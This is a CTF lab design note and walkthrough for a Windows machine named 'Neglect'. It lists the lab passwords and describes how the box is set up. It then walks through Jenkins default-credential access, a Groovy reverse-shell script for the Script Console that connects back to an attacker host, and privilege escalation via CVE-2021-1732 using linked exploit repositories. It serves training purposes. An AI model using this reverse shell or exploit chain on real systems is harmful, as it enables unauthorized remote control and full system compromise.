# Neglect

## Introduction

This box is designed to simulate a real world experience I saw as a Penetration Tester in a Windows corporate environment. While during the engagements we had RDP access, I have created this box to a HackTheBox style machine that exploits a Jenkins server (another avenue of attack I often see in engagements and in Bug Bounties with default credentials) with the service running under the user account, then exploit an oudated version of Windows 10, vulnerable to CVE-2021-1732 for the path to root. This assessment was a memorable one for me as I had to dig deep into researching every bit of information I had on the given machine, and it was after days of researching CVE's, I landed on a somewhat questionable GitHub page. After figuring out how to properly compile a solution for the first time as a Penetration Tester, I was able to land a shell as NT AUTHORITY\SYSTEM.

Originally created for a CTF, I made this doable with just SSH access. The ultimate takeaway from this engagements is something I always believe in, check EVERYTHING! The port number Jenkins is running on is not one a standard nmap scan would find as it is on port 1732, made to help point in the direction of the CVE to use and to further emphasize how you should check everything, including every possible port that could be open.
## Info for HTB

### Access

Passwords:

| User  | Password                            |
| ----- | ----------------------------------- |
| joe | DontForgetToChangeMe1! |
| fisher (admin)  | fqDE*Srp2!uV5si^*v |

### Key Processes

localhost:1732 - Jenkins server. The server is run under the user joe.

OpenSSH Server/Client - allows for non GUI access to the machine to run exploit

### Automation / Crons

To start the box, just turn it on and all necessary processes should start on boot. The Jenkins server will start under the user joe and OpenSSH should start automatically on boot.

### Firewall Rules

The firewall is allowing ingoing and outgoing communication through port 1732 to allow players to access the Jenkins server and receive reverse shells.

### Docker

N/A

### Other

There is a file under the user joe that reveals the password in plaintext. Also inside this text file is a message from the user fisher which informs the user of their new password and to not forget to install updates as they did not have the time to do it themselves. This leads to the name of the box, Neglect. Considering the plaintext password found in the text file is joe's unchanged password of "DontForgetToChangeMe1!", players are to allude that joe did not update his computer either. From there, if they were to enumerate the build number of the OS, they can then find the CVE and the necessary exploit to gain a path to root.

Windows Defender has an exclusion on the user joe's entire directory to allow players to upload the exploit to the machine. During my real engagement, I had to find a server that had a folder being excluded from AV scans, but this machine is not intended to provide that much defense.

The password for the admin account was purposely made complicated to prevent players from cracking/brute forcing the login. The goal is to find the CVE, compile the exploit, and gain admin in that manner.

## Writeup

Nmap scan
```
nmap -sCV -p- 10.254.95.172 -Pn
```
![Screenshot 2023-03-16 at 12 39 48 AM](https://user-images.githubusercontent.com/83108604/225516425-be1fff1d-9363-43ac-ab47-f88189ad6785.png)

We can see we have a Jenkins server running on port 1732.

![Screenshot 2023-03-16 at 12 44 23 AM](https://user-images.githubusercontent.com/83108604/225516651-383f92da-549c-4143-8bc3-3c9013e4dd22.png)

Players at this point should try to search for default credentials. Upon some searching, they should find the credentials admin:password which will log them into the server.

![Screenshot 2023-03-16 at 1 05 17 AM](https://user-images.githubusercontent.com/83108604/225519969-2f13fd50-8da7-4953-b070-bacfa0894271.png)
Searching around the web page, players should find their way into the Manage Jenkins, then should notice the 
Script Console" option that looks interesting.

![Screenshot 2023-03-16 at 1 04 34 AM](https://user-images.githubusercontent.com/83108604/225519887-2db12c73-5a77-48aa-8e0b-a60288b7ac8a.png)

There are plenty of resources available with a google search of "jenkins reverse shell script" such as - https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6:
```
Revsh.groovy

String host=”localhost”;
int port=8044;
String cmd=”cmd.exe”;
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
Step 4: The attacker has to change the value of three parameters as per his setup. These parameters are:

host
port
cmd
Check the IP address of the attacker machine.
```
Once the player modifies the script, they will receive a reverse shell connection back.

![Screenshot 2023-03-16 at 1 45 25 AM](https://user-images.githubusercontent.com/83108604/225526298-43350731-196d-49b9-874f-e03d0c4acb0a.png)

Running whoami to confirm players have the user account:

![Screenshot 2023-03-16 at 1 48 21 AM](https://user-images.githubusercontent.com/83108604/225526432-8a50436e-b1c4-4096-9b34-1168396c0636.png)

Moving to the user's desktop to retrieve the user flag:

![Screenshot 2023-03-16 at 1 53 26 AM](https://user-images.githubusercontent.com/83108604/225527258-97f3d867-0dad-48bd-85cb-d88fb71da48a.png)

Reading the setup.txt file on the desktop:

![Screenshot 2023-03-16 at 1 54 56 AM](https://user-images.githubusercontent.com/83108604/225527494-189938a5-4e75-465b-a61c-47eb550abfef.png)

Players should check for information about the system and find it is running Windows 10 Build 17134:

![Screenshot 2023-03-16 at 1 55 27 AM](https://user-images.githubusercontent.com/83108604/225527571-e20f3d95-4a1f-4170-8791-20c98a2be324.png)

The CVE in particular we are searching for is CVE-2021-1732. This is where things start to get difficult to find the exploit. There is only one that worked for me but others may end up working for players. I have forked the GitHub I utilized - https://github.com/deceptech/CVE-2021-1732-Windows-10-Build-17134-Exploit - and the original can be found here - https://github.com/KaLendsi/CVE-2021-1732-Exploit. The exploit must be compiled at this point and players must find a way to upload it to the machine. Once uploaded, we can then run the exploit in CMD either through this reverse shell or in an SSH session:

![Screenshot 2023-03-16 at 2 23 35 AM](https://user-images.githubusercontent.com/83108604/225532438-9b4deef3-5706-4530-b9a0-7f611518242e.png)

We can utilize this exploit to get the root flag found on fisher's desktop in a variety of different manners such as creating a new admin account, attempting to parse the root flag with this exploit, or copying the file to a directory in which they do not need root access.





